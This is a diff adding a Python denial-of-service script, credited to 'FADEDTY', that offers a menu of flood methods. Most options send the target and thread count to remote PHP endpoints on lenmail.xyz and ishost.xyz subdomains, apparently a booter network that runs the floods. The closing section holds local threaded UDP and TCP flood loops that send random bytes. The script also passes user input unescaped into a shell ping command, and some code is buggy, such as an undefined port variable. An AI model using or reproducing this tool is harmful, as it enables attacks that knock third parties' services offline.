@@ -1,0 +1,286 @@
+#CODE BY FADEDTY
+#LU BUKAN YUTUBER JADI JANGAN REKOD
+import os
+from time import sleep
+from os import system
+from sys import exit
+import random
+import socket
+import threading
+import requests
+import sys, cfscrape, requests
+
+
+crape = cfscrape.create_scraper()
+
+status = """
+Host                          Response Code
+--------------------------------------------
+"""
+method = """
+#################################################
+## 0.TOOLS         5.HEAD  	10.UDPBOT      ##
+## 1.TCP           6.POST 	11.COMING SOON ##
+## 2.UDP           7.NULL	12.COMING SOON ## 
+## 3.SLOW          8.GET	13.COMING SOON ##
+## 4.RANDOM L4     9.CFB 	14.COMING SOON ##
+#################################################
+
+"""
+tools = """
+#####################
+## 0.BACK  	   ##
+## 1.PING	   ##
+## 2.NS LOOKUP	   ##
+## 3.PORT SCANNER  ##
+## 4.CHECK STATUS  ##
+#####################
+"""
+
+allready_connected = 0
+
+print(method)
+print("SELECT THE METHOD")
+choice = input("Method: ")
+if choice == '0':
+	print(tools)
+	tool = input("tools: ")
+	if tool == '0':
+		system("python3 WORK")
+	if tool == '1':
+		host = input("host: ")
+		system("ping -c 7 """+host+"")
+		system("python3 WORK")
+	if tool == '2':
+		system("python3 nsl.py")
+	if tool == '3':
+		system("python3 ps")
+	if tool == '4':
+		system("python3 uptime.py")
+	else:
+		print("Worng Input!!")
+		system("python3 WORK")
+if choice == '5':
+	print("MUST USE HTTP/HTTPS!!")
+	ip = input("Host :")
+	threads = input("Threads: ")
+	print(" ") 
+	print("SENT PACKET TO "+ip+"")
+	print(" ")
+	print("CTRL-Z TO EXIT")
+	crape.get("http://1.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://2.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://3.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://4.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://5.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://6.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://7.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://8.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://9.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://10.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://11.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://12.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://13.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://14.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://15.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://16.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://17.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://18.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://19.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://20.lenmail.xyz/head.php?url="+ip+"&c="+threads+"s=p")
+if choice == '3':
+	print("EXAMPLE: HOST:PORT")
+	host5 = input("Host/ip: ")
+	print("Default 550")
+	turbo = input("Thread: ")
+	print(" ")
+	print("SENT PACKET TO "+host5+"")
+	print(" ")
+	print("CTRL-Z TO EXIT")
+	crape.get("http://1.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://2.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://3.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://4.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://5.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://6.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://7.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://8.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://9.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://10.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://11.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://12.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://13.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://14.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://15.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://16.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://17.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://18.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://19.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://20.lenmail.xyz/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+
+if choice == '10':
+        print("EXAMPLE: HOST:PORT")
+        host5 = input("Host/ip: ")
+        print("Default 550")
+        turbo = input("Thread: ")
+        print(" ")
+        crape.get("http://1.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://2.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://3.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://4.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://5.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://6.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://7.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://8.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://9.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://10.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://11.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://12.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://13.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://14.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+        crape.get("http://15.ishost.xyz/udp.php?act=phptools&host="+host5+"&time="+turbo+"")
+
+if choice == '6':
+        print("MUST USE HTTP/HTTPS!!")
+        h6 = input("Host/ip: ")
+        print("default 5")
+        th6 = input("Thread: ")
+        print(" ")
+        print("SENT PACKET TO "+h6+"")
+        print(" ")
+        print("CTRL-Z TO EXIT")
+        crape.get("http://1.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://2.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://3.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://4.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://5.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://6.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://7.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://8.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://9.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://10.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://11.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://12.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://13.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://14.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://15.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://16.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://17.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://18.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://19.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://20.lenmail.xyz/post.php?url="+h6+"&c="+th6+"s=p")
+
+if choice == '7':
+	print("MUST USE HTTP/HTTPS!!")
+	h7 = input("Host/ip: ")
+	print("default 5")
+	th7 = input("Thread: ")
+	print(" ")
+	print("SEND PACKET TO "+h7+"")
+	print(" ")
+	print("CTRL-Z TO EXIT")
+	crape.get("http://1.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://2.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://3.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://4.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://5.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://6.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://7.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://8.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://9.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://10.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://11.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://12.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://13.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://14.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://15.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://16.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://17.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://18.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://19.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://20.lenmail.xyz/null.php?url="+h7+"&c="+th7+"s=p")
+
+if choice == '8':
+        print("MUST USE HTTP/HTTPS!!")
+        h8 = input("Host/ip: ")
+        print("default 5")
+        th8 = input("Thread: ")
+        print(" ")
+        print("SENT PACKET TO "+h8+"")
+        print(" ")
+        print("CTRL-Z TO EXIT")
+        crape.get("http://1.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://2.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://3.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://4.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://5.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://6.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://7.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://8.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://9.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://10.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://11.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://12.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://13.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://14.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://15.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://16.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://17.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://18.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://19.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://20.lenmail.xyz/get.php?url="+h8+"&c="+th8+"s=p")
+
+if choice =='9':
+	system("python3 cfb.py")
+else:
+	print("WORNG INPUT")
+	system("python3 WORK")
+
+print("EXAMPLE IP:PORT")
+ip = input(" Host/Ip: ")
+times = int(input(" Packets per one connection:"))
+threads = int(input(" Threads:"))
+
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("!","!","!"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("!","!","!"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == '1':
+		th = threading.Thread(target = run)
+		th.start()
+	if choice == '2':
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == '4':
+		th = threading.Thread(target = run)
+		th2 = threading.Thread(target = run2)
+		th.start()
+		th2.start()
+	else:
+		print("WORNG INPUT!!")
+		system("python3 WORK")
